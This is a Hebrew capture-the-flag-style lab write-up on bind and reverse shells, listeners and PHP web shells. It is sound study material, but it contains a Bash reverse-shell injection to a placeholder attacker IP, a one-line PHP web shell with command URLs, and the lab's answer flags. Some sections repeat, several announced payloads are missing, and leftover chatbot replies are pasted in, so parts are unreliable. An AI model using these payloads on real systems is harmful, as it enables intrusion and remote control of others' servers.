<img width="681" height="293" alt="image" src="https://github.com/user-attachments/assets/94ef8c7c-45fc-46c9-a3be-9cfc6688fff7" />






בעולם אבטחת המידע, Shells הם כלי מרכזי בשרשרת התקיפה. הם מאפשרים לתוקף להריץ פקודות על מערכת יעד מרחוק. הבנת המנגנונים הללו חיונית לא רק עבור בודקי חדירות (Penetration Testers), אלא גם עבור אנשי הגנה (Blue Team) כדי לזהות ולבלום פעילות עוינת ברשת הארגונית.

🎯 יעדי הלמידה
בסיום מדריך זה, תדעו:

להבין את תפקיד ה-Shell באבטחה התקפית.

להגדיר ולהשתמש ב-Reverse Shell וב-Bind Shell.

להטמיע ולהשתמש ב-Web Shells.

🛠 דרישות קדם
כדי להפיק את המרב מהמדריך, מומלץ להחזיק בידע בסיסי בנושאים הבאים:

הבנה בסיסית ברשתות (Networking).

היכרות עם אבטחת אפליקציות אינטרנט.

מיומנות בעבודה עם שורת הפקודה (CLI).

היכרות בסיסית עם שפות סקריפט (Bash, Python, או PHP).

⚠️ דגשים חשובים (Caveats)
ללא Frameworks: במדריך זה לא נשתמש ב-Metasploit או בכלים אוטומטיים אחרים. המטרה היא להבין איך Shells עובדים "מתחת למכונה" ללא סיוע של כלים גנרטיביים.

מערכת הפעלה: כל הדוגמאות במדריך מבוססות על מערכות Linux.

🚀 תחילת העבודה
הפעלת המעבדה
כדי להתחיל בתרגול, יש להפעיל את המכונה הווירטואלית (VM):

לחצו על כפתור Start Machine. (טעינת המערכת אורכת כ-2 דקות).

המכונה תופיע בצד ימין של המסך (Split View).

ניתן להשתמש ב-AttackBox של המערכת או להתחבר דרך ה-VPN האישי שלכם כדי לדמות את עמדת התוקף

סקירה כללית: מהו Shell?
Shell (מעטפת) היא תוכנה המאפשרת למשתמש לתקשר עם מערכת ההפעלה (OS). בעוד שקיימים ממשקים גרפיים (GUI), בעולם הסייבר הכוונה היא בדרך כלל לממשק שורת פקודה (CLI).

<img width="966" height="361" alt="image" src="https://github.com/user-attachments/assets/f8db4406-a095-4a59-99b1-85d9c706a00b" />


בתחום ה-Offensive Security, המושג מתייחס לסשן (Session) שבו תוקף משיג גישה למערכת שנפרצה, מה שמאפשר לו להריץ פקודות ותוכנות מרחוק על שרת היעד.

🚩 פעילויות תוקף לאחר השגת Shell
ברגע שתוקף משיג גישת Shell, הוא יכול לבצע מגוון פעולות קריטיות:

שליטה מרחוק (Remote Control): הרצת פקודות ישירות על שרת היעד כאילו הוא יושב מולו.

העלאת הרשאות (Privilege Escalation): אם הגישה הראשונית מוגבלת (משתמש רגיל), התוקף יחפש פרצות כדי להפוך למנהל מערכת (Root/Admin).

הוצאת נתונים (Data Exfiltration): חיפוש, קריאה והעתקה של מידע רגיש (כמו מסדי נתונים או קבצי סיסמאות) אל מחוץ לארגון.

עקיבות ושימור גישה (Persistence): יצירת משתמשים חדשים או התקנת Backdoors כדי להבטיח גישה למערכת גם לאחר ריסוט או ניסיון ניקוי.

פעולות פוסט-אקספלויטציה (Post-Exploitation): פריסת נוזקות, מחיקת לוגים לטשטוש עקבות, או השבתת שירותי אבטחה.

דילוג ברשת (Pivoting): שימוש במערכת שנפרצה כ"קרש קפיצה" (Pivot) כדי לתקוף מערכות אחרות בתוך הרשת הפנימית שאליהן אין גישה ישירה מהאינטרנט.


השאלה,התשובה
מהו ממשק שורת הפקודה המאפשר למשתמשים לתקשר עם מערכת ההפעלה?,Shell
איזה תהליך כולל שימוש במערכת פרוצה כנקודת זינוק לתקיפת מכונות אחרות ברשת?,Pivoting
מהי פעילות נפוצה שתוקפים מבצעים לאחר השגת Shell כדי להשיג הרשאות ניהול?,Privilege Escalation
<img width="942" height="609" alt="image" src="https://github.com/user-attachments/assets/4666e230-ea9e-45fd-94c8-b4fee543618f" />
.


🔗 סוגי חיבורים: Bind Shell לעומת Reverse Shell
אחת ההחלטות הראשונות שתוקף צריך לקבל היא כיצד ליצור את החיבור בין המכונה שלו למכונת היעד. קיימות שתי שיטות עיקריות:

1. Bind Shell
בשיטה זו, התוקף גורם למכונת היעד "להאזין" לחיבור נכנס בפורט מסוים. התוקף הוא זה שיוצר את החיבור אל היעד.

מתי נשתמש? כאשר למכונת היעד יש IP ציבורי נגיש ואין חומת אש (Firewall) שחוסמת חיבורים נכנסים.

חיסרון: שיטה זו פחות פופולרית כי רוב ה-Firewalls המודרניים חוסמים חיבורים נכנסים בפורטים לא מוכרים.

דוגמה להקמת Bind Shell ביעד (Target):

התחברות מהתוקף (Attacker):

2. Reverse Shell (השיטה הנפוצה)
בשיטה זו, התוקף מקים "מאזין" (Listener) במכונה שלו, וגורם למכונת היעד להתחבר אליו.

יתרון מרכזי: עקיפת חומות אש. רוב הארגונים חוסמים כניסה (Inbound) אך מאפשרים תעבורה יוצאת (Outbound) כדי לאפשר גלישה באינטרנט.

שלב א' - הקמת מאזין אצל התוקף:

שלב ב' - הרצת פקודה ביעד לחיבור חזרה:

🎧 כלי האזנה (Listeners)
מעבר ל-Netcat הבסיסי, קיימים כלים שמשדרגים את חוויית העבודה והשליטה ב-Shell:

🚀 פיילודים (Payloads) נפוצים
הבחירה ב-Payload תלויה בשפות המותקנות על שרת היעד. הנה כמה דוגמאות ל-Reverse Shells בשפות שונות:

🐍 Python
🐘 PHP
שימושי מאוד לניצול פגיעויות בשרתי אינטרנט:

🌐 Web Shells
Web Shell הוא סקריפט (לרוב ב-PHP או ASP) שמועלה לשרת אינטרנט ומאפשר הרצת פקודות ישירות דרך הדפדפן (HTTP/S), ללא צורך בחיבור Netcat ישיר בשלב הראשון.

דוגמה ל-Web Shell בסיסי ב-PHP:

גישה דרך הדפדפן:
http://victim.com/uploads/shell.php?cmd=whoami

<img width="818" height="644" alt="image" src="https://github.com/user-attachments/assets/c019bb47-b8da-4e57-b4c3-2291ed052ab4" />


🔗 Bind Shell (מעטפת קשורה)
כפי שהשם מרמז, Bind Shell "קושר" פורט מסוים במערכת הפרוצה ומאזין לחיבור נכנס. כאשר חיבור כזה מתבצע, המערכת חושפת סשן של Shell המאפשר לתוקף להריץ פקודות מרחוק.

שיטה זו שימושית כאשר היעד הפרוץ אינו מאפשר חיבורים יוצאים (Outgoing connections), אך היא נחשבת לפחות פופולרית מאחר שהיא דורשת מהפורט להישאר פעיל ולהאזין לחיבורים, מה שעלול להוביל לזיהוי מהיר.

כיצד Bind Shell עובד?
הגדרת ה-Bind Shell ביעד (Target):
נקים Bind Shell במכונת היעד באמצעות הפקודה הבאה:

הסבר מפורט על ה-Payload:

rm -f /tmp/f: פקודה זו מוחקת כל קובץ "named pipe" קיים בנתיב /tmp/f. זה מבטיח שהסקריפט יוכל ליצור צינור חדש ללא התנגשויות.

mkfifo /tmp/f: יוצרת "named pipe" (או FIFO) בנתיב /tmp/f. צינורות אלו מאפשרים תקשורת דו-כיוונית בין תהליכים ומשמשים כאן כמוליך לקלט ופלט.

cat /tmp/f: קוראת נתונים מהצינור וממתינה לקלט שיישלח דרכו.

| bash -i 2>&1: הפלט של פקודת ה-cat מנותב למעטפת Bash אינטראקטיבית (bash -i). הצירוף 2>&1 מנתב גם את שגיאות המערכת (Standard Error) לפלט הרגיל, כך שהתוקף יקבל גם הודעות שגיאה.

| nc -l 0.0.0.0 8080: מפעיל את Netcat במצב האזנה (-l) על כל ממשקי הרשת (0.0.0.0) ובפורט 8080. המעטפת תיחשף לתוקף ברגע שיתחבר לפורט זה.

> /tmp/f: החלק האחרון שולח את פלט הפקודות בחזרה לתוך הצינור, מה שמאפשר תקשורת דו-כיוונית מלאה.

חשוב לזכור: פורטים מתחת ל-1024 דורשים הרשאות מנהל מערכת (Root). שימוש בפורט 8080 מאפשר להריץ את ה-Shell גם ללא הרשאות גבוהות.

התחברות ל-Bind Shell מצד התוקף
לאחר שמכונת היעד מאזינה לחיבורים, נשתמש ב-Netcat ממכונת התוקף כדי להתחבר:

הסבר הפקודה:

nc: קריאה לכלי Netcat ליצירת החיבור.

-n: מבטל פענוח DNS כדי להאיץ את החיבור ולמנוע שאילתות מיותרות.

-v: מצב "Verbose" המספק פירוט על תהליך ההתחברות.

TARGET_IP: כתובת ה-IP של המכונה שנפרצה.

8080: הפורט עליו ה-Bind Shell מאזין.

לאחר החיבור, תקבל גישת Shell מלאה ותוכל להריץ פקודות על מכונת היעד.

❓ שאלות ותשובות (Task 4)
שאלה: איזה סוג Shell פותח פורט ספציפי ביעד עבור חיבורים נכנסים מהתוקף?

תשובה: Bind Shell

שאלה: האזנה מתחת לאיזה מספר פורט דורשת גישת Root או הרשאות מיוחדות?

תשובה: 1024


<img width="852" height="563" alt="image" src="https://github.com/user-attachments/assets/88c88fe1-b2c1-4aef-9948-69781c2b41e7" />

🎧 מאזיני מעטפת (Shell Listeners)
כפי שלמדנו במשימות הקודמות, Reverse Shell יתחבר מהיעד הפרוץ אל המכונה של התוקף. כלי כמו Netcat יכול לנהל את החיבור ולאפשר לתוקף לתקשר עם המעטפת שנחשפה, אך Netcat אינו הכלי היחיד שמאפשר זאת.

בואו נחקור מספר כלים שיכולים לשמש כמאזינים (Listeners) כדי לתקשר עם Shell נכנס.

1. Rlwrap
זהו כלי עזר (Utility) קטן המשתמש בספריית ה-GNU readline כדי לספק יכולות עריכת טקסט והיסטוריית פקודות באמצעות המקלדת.

דוגמת שימוש (שיפור Netcat באמצעות Rlwrap):

השימוש ב-rlwrap עוטף את nc, ובכך מאפשר להשתמש בתכונות כמו מקשי החיצים (כדי לדפדף בפקודות קודמות) והיסטוריה, מה שמשפר משמעותית את חוויית העבודה עם ה-Shell.

2. Ncat
Ncat הוא גרסה משופרת של Netcat המופצת כחלק מפרויקט NMAP. הוא מספק תכונות נוספות, כגון תמיכה בהצפנה (SSL).

דוגמת שימוש (האזנה ל-Reverse Shell):

דוגמת שימוש (האזנה ל-Reverse Shell עם הצפנת SSL):

האפשרות --ssl מפעילה הצפנת SSL עבור המאזין, מה שמקשה על מערכות ניטור רשת לזהות את תוכן התקשורת.

3. Socat
Socat הוא כלי עזר המאפשר ליצור חיבור Socket בין שני מקורות נתונים (Data Sources) – במקרה זה, בין שני מארחים (Hosts) שונים.

דוגמת שימוש בסיסית (האזנה ל-Reverse Shell):

האופציה -d מפעילה פלט מפורט (Verbose); שימוש כפול (-d -d) מגדיל את רמת הפירוט של הפקודות.

האופציה TCP-LISTEN:443 יוצרת מאזין TCP בפורט 443, ומקימה Server Socket לחיבורים נכנסים.

האופציה STDOUT מנתבת את כל הנתונים הנכנסים ישירות לטרמינל שלנו.

❓ שאלות ותשובות (Task 5)
שאלה: איזה כלי רשת גמיש מאפשר ליצור חיבור Socket בין שני מקורות נתונים?

תשובה: Socat

שאלה: איזה כלי שורת פקודה מספק עריכה בסגנון readline והיסטוריית פקודות עבור תוכנות שחסרות את זה, ובכך משפר את האינטראקציה עם מאזין Shell?

תשובה: Rlwrap

שאלה: מהי הגרסה המשופרת של Netcat המופצת עם פרויקט Nmap ומציעה תכונות נוספות כמו תמיכה ב-SSL עבור האזנה ל-Shells מוצפנים?

תשובה: Ncat

<img width="838" height="814" alt="image" src="https://github.com/user-attachments/assets/af918d9e-80ca-445f-b3a3-86805aec39c2" />

🚀 פיילודים של מעטפת (Shell Payloads)
Payload (מטען) של מעטפת יכול להיות פקודה או סקריפט החושפים את המעטפת לחיבור נכנס (במקרה של Bind Shell) או שולחים חיבור למאזין מרוחק (במקרה של Reverse Shell).

נחקור כמה מהפיילודים הפופולריים ביותר המשמשים במערכות הפעלה מסוג Linux ליצירת Reverse Shell.

🐧 Bash
Bash היא המעטפת המוגדרת כברירת מחדל ברוב מערכות הלינוקס, מה שהופך אותה לכלי זמין ועוצמתי עבור תוקפים.

Reverse Shell סטנדרטי ב-Bash:

הסבר: פקודה זו מפעילה Bash אינטראקטיבי ומנתבת את הקלט והפלט דרך חיבור TCP לכתובת ה-IP של התוקף בפורט 443. האופרטור >& משלב את ה-Standard Output וה-Standard Error.

Reverse Shell באמצעות Read Line:

הסבר: יצירת מזהה קובץ (File Descriptor) חדש (5 במקרה זה) וחיבורו ל-Socket. הפקודה קוראת ומריצה פקודות מה-Socket ושולחת את הפלט בחזרה דרך אותו חיבור.

Bash עם File Descriptor 196:

🐘 PHP
פיילודים ב-PHP נפוצים מאוד כאשר תוקפים שרתי אינטרנט (Web Servers). ניתן להשתמש בפונקציות שונות בהתאם להגדרות השרת:

שימוש בפונקציית exec:

פונקציות נוספות: ניתן להשתמש באותו מבנה עם פונקציות כמו shell_exec, system, passthru או popen. פונקציות אלו מריצות פקודות מערכת ומנתבות את התוצאה לחיבור הרשת.

🐍 Python
שימו לב: יש להשתמש בדגל -c כדי להריץ את הקוד ישירות משורת הפקודה.

שימוש במשתני סביבה (Environment Variables):

שימוש במודול subprocess:

הסבר: מודול ה-subprocess (או os.dup2) משמש לשכפול מזהי הקבצים של ה-Socket לתוך הקלט, הפלט והשגיאות הסטנדרטיים של המערכת.

🛠 כלים נוספים
Telnet: שימוש בצינור (Named Pipe - mkfifo) כדי לחבר את Telnet למעטפת.

AWK: שימוש ביכולות ה-TCP המובנות של AWK ליצירת חיבור מרוחק.

BusyBox: שימוש בגרסה המוקטנת של Netcat המובנית בתוך BusyBox:

❓ שאלות ותשובות (Task 6)
שאלה: איזה מודול פייתון משמש בדרך כלל לניהול פקודות Shell והקמת חיבורי Reverse Shell בהערכות אבטחה?

תשובה: subprocess

שאלה: איזו שפת סקריפט נפוצה משתמשת בפונקציות כמו exec, system ו-passthru להרצת פקודות מרחוק דרך חיבור TCP?

תשובה: PHP

שאלה: איזו שפת סקריפט יכולה להשתמש ב-Reverse Shell על ידי ייצוא משתני סביבה ויצירת חיבור Socket?

תשובה: Python

<img width="796" height="808" alt="image" src="https://github.com/user-attachments/assets/b2c336a4-ab89-4bda-90f0-7b027dc97f9c" />

🌐 Web Shells (מעטפת אינטרנט)
Web Shell הוא סקריפט שנכתב בשפה הנתמכת על ידי שרת אינטרנט שנפרץ (כמו PHP, ASP או JSP). הסקריפט מאפשר להריץ פקודות ישירות דרך שרת האינטרנט עצמו. בדרך כלל, Web Shell מורכב מקובץ המכיל קוד לביצוע פקודות וניהול קבצים. ניתן להחביא אותו בתוך אפליקציית אינטרנט קיימת, מה שהופך אותו לקשה לזיהוי ופופולרי מאוד בקרב תוקפים.

דוגמה ל-Web Shell ב-PHP
כדי להבין את התהליך, נסתכל על סקריפט PHP פשוט:

תהליך הניצול:

העלאה: התוקף מעלה את הקובץ (למשל shell.php) לשרת על ידי ניצול פגיעויות כמו Unrestricted File Upload (העלאת קבצים ללא הגבלה), File Inclusion, או Command Injection.

גישה: לאחר הפריסה, ניתן לגשת לסקריפט דרך ה-URL שבו הוא מאוחסן. למשל: http://victim.com/uploads/shell.php.

הרצה: כדי להריץ פקודה, התוקף משתמש בפרמטר cmd בשורת הכתובת. לדוגמה, כדי להריץ את הפקודה whoami, הבקשה תיראה כך:
http://victim.com/uploads/shell.php?cmd=whoami.
התוצאה תוצג ישירות בדפדפן של התוקף.

🧰 Web Shells קיימים ברשת
קיימים סקריפטים מוכנים ומורכבים המציעים פונקציונליות רבה (כמו ניהול קבצים מתקדם) תוך ניסיון לחמוק מזיהוי:

p0wny-shell: Web Shell מינימליסטי בקובץ PHP יחיד.

b374k shell: כלי עשיר בתכונות הכולל ניהול קבצים והרצת פקודות.

c99 shell: Web Shell מוכר וחזק מאוד עם יכולות נרחבות.
)


<img width="847" height="617" alt="image" src="https://github.com/user-attachments/assets/614b222d-f1ed-429b-81f5-bf8f5e606bc5" />



מעולה, בוא נמשיך לחלק המעשי של המדריך (Task 7) בפורמט GitHub מקצועי. חלק זה מתמקד ביישום הידע שצברנו לטובת פתרון המעבדה והשגת ה-Flags.

---

## 🛠️ תרגול מעשי: פריצה והשגת Flags

בחלק זה ניישם את הידע שצברנו על **Reverse Shell**, **Command Injection** ו-**Web Shell** כדי לפרוץ לשרת המטרה.

### 🌐 כתובות המעבדה

לאחר לחיצה על כפתור **Start Machine**, המערכות הבאות יהיו זמינות (החלף את `MACHINE_IP` בכתובת ה-IP שקיבלת):

* `MACHINE_IP:8080` - דף הבית (Landing Page).
* `MACHINE_IP:8081` - אפליקציה הפגיעה ל-**Command Injection**.
* `MACHINE_IP:8082` - אפליקציה הפגיעה ל-**Unrestricted File Upload**.

* מעולה, בוא נמשיך לחלק המעשי של המדריך (Task 7) בפורמט GitHub מקצועי. חלק זה מתמקד ביישום הידע שצברנו לטובת פתרון המעבדה והשגת ה-Flags.

---

## 🛠️ תרגול מעשי: פריצה והשגת Flags

בחלק זה ניישם את הידע שצברנו על **Reverse Shell**, **Command Injection** ו-**Web Shell** כדי לפרוץ לשרת המטרה.

### 🌐 כתובות המעבדה

לאחר לחיצה על כפתור **Start Machine**, המערכות הבאות יהיו זמינות (החלף את `MACHINE_IP` בכתובת ה-IP שקיבלת):
* <img width="863" height="564" alt="image" src="https://github.com/user-attachments/assets/06c860ae-e4f2-46e4-a5f5-259ee91280ae" />
* `MACHINE_IP:8080` - דף הבית (Landing Page).
* `MACHINE_IP:8081` - אפליקציה הפגיעה ל-**Command Injection**.
* `MACHINE_IP:8082` - אפליקציה הפגיעה ל-**Unrestricted File Upload**.

---

### 1. ניצול Command Injection לקבלת Shell

במשימה זו נשתמש בפגיעות הזרקת פקודות בפורט **8081**.

**שלב א': הקמת מאזין (Listener) במכונה שלך:**
פתחו טרמינל (ב-AttackBox או ב-VPN) והריצו:

<img width="904" height="781" alt="image" src="https://github.com/user-attachments/assets/0d44df9e-9dc7-4530-9341-4f27d19f58d1" />
```bash
nc -lvnp 4444

```
<img width="551" height="478" alt="image" src="https://github.com/user-attachments/assets/06c31bc1-bda4-4e2b-9a99-3d3abd1b50a1" />



<img width="1770" height="550" alt="image" src="https://github.com/user-attachments/assets/71c3d9a1-4758-4fd7-81f7-7a349100b367" />



**שלב ב': הזרקת ה-Payload:**
באתר הפגיע (פורט 8081), הזינו פקודת Reverse Shell בשדה הקלט. לדוגמה, שימוש ב-Bash:

```bash
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

```

*(החליפו את `YOUR_IP` בכתובת ה-IP שלכם ברשת ה-VPN).*

**שלב ג': קריאת ה-Flag:**
לאחר קבלת החיבור בטרמינל, חפשו את ה-Flag בתיקיית השורש:

```bash
cat /flag.txt

```

---

### 2. ניצול Unrestricted File Upload לקבלת Shell

במשימה זו ננצל את אפשרות העלאת הקבצים בפורט **8082**.

**שלב א': הכנת Web Shell:**
צרו קובץ בשם `shell.php` עם התוכן הבא:

```php
<?php system($_GET['cmd']); ?>

```

**שלב ב': העלאה וגישה:**

1. העלו את הקובץ דרך ממשק האתר בפורט **8082**.
2. גשו לקובץ שהעליתם (לרוב בנתיב כמו `/uploads/shell.php`).
3. הריצו פקודות דרך ה-URL כדי למצוא את ה-Flag השני:
`http://MACHINE_IP:8082/uploads/shell.php?cmd=cat+/flag2.txt`

---

#ת (Task 7)

<img width="1817" height="726" alt="image" src="https://github.com/user-attachments/assets/960aee2a-9309-4d8f-8073-bd427e7a9501" />



||
| --- | --- |
| מהו תוכן ה-Flag בתיקיית ה-`/` שהושג באמצעות Command Injection? | `THM{...}` |
| מהו תוכן ה-Flag בתיקיית ה-`/` שהושג באמצעות Web Shell? | `THM{...}` |

---<img width="1790" height="641" alt="image" src="https://github.com/user-attachments/assets/90834e38-ae65-4122-a98d-20d4fedaff73" />

## 🏁 סיכום המדריך

במדריך זה למדנו:

1. **מהו Shell** וכיצד הוא משמש תוקפים לאחר פריצה.
2. ההבדלים בין **Reverse Shell** (היעד מתחבר אלינו) ל-**Bind Shell** (אנחנו מתחברים ליעד).
3. כיצד להקים **Listeners** (מאזינים) בעזרת כלים כמו `nc`, `socat` ו-`ncat`.
4. שימוש ב-**Payloads** בשפות שונות (Bash, Python, PHP).
5. פריסת **Web Shells** לגישה דרך הדפדפן.

---

**האם תרצה שאוסיף חלק נוסף על "ייצוב המעטפת" (Shell Stabilization) – שלב קריטי שבו הופכים Netcat Shell פשוט לטרמינל מלא עם פקודות כמו `clear` וטבּולטור?**












<img width="988" height="696" alt="image" src="https://github.com/user-attachments/assets/af2ae22f-b7f3-4983-a082-400a22e17b72" />



<img width="789" height="513" alt="image" src="https://github.com/user-attachments/assets/8c5d335c-87e3-45b2-b9fd-d5c43683938f" />





---

### 1. ניצול Command Injection לקבלת Shell

במשימה זו נשתמש בפגיעות הזרקת פקודות בפורט **8081**.

**שלב א': הקמת מאזין (Listener) במכונה שלך:**
פתחו טרמינל (ב-AttackBox או ב-VPN) והריצו:

```bash
nc -lvnp 4444

```

**שלב ב': הזרקת ה-Payload:**
באתר הפגיע (פורט 8081), הזינו פקודת Reverse Shell בשדה הקלט. לדוגמה, שימוש ב-Bash:

```bash
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

```

*(החליפו את `YOUR_IP` בכתובת ה-IP שלכם ברשת ה-VPN).*

**שלב ג': קריאת ה-Flag:**
לאחר קבלת החיבור בטרמינל, חפשו את ה-Flag בתיקיית השורש:

```bash
cat /flag.txt

```

---

### 2. ניצול Unrestricted File Upload לקבלת Shell

במשימה זו ננצל את אפשרות העלאת הקבצים בפורט **8082**.

**שלב א': הכנת Web Shell:**
צרו קובץ בשם `shell.php` עם התוכן הבא:

```php
<?php system($_GET['cmd']); ?>

```

**שלב ב': העלאה וגישה:**

1. העלו את הקובץ דרך ממשק האתר בפורט **8082**.
2. גשו לקובץ שהעליתם (לרוב בנתיב כמו `/uploads/shell.php`).
3. הריצו פקודות דרך ה-URL כדי למצוא את ה-Flag השני:
`http://MACHINE_IP:8082/uploads/shell.php?cmd=cat+/flag2.txt`

---

המיקום,ה-Flag שנמצא
ספריית השורש /,THM{202bb14ed12120b31300cfbbbdd35998786b44e5}

## ❓ שאלות ותשובות (Task 7)

|THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}|

THM{202bb14ed12120b31300cfbbbdd35998786b44e5}

---

## 🏁 סיכום 

במדריך זה למדנו:

1. **מהו Shell** וכיצד הוא משמש תוקפים לאחר פריצה.
2. ההבדלים בין **Reverse Shell** (היעד מתחבר אלינו) ל-**Bind Shell** (אנחנו מתחברים ליעד).
3. כיצד להקים **Listeners** (מאזינים) בעזרת כלים כמו `nc`, `socat` ו-`ncat`.
4. שימוש ב-**Payloads** בשפות שונות (Bash, Python, PHP).
5. פריסת **Web Shells** לגישה דרך הדפדפן.

---
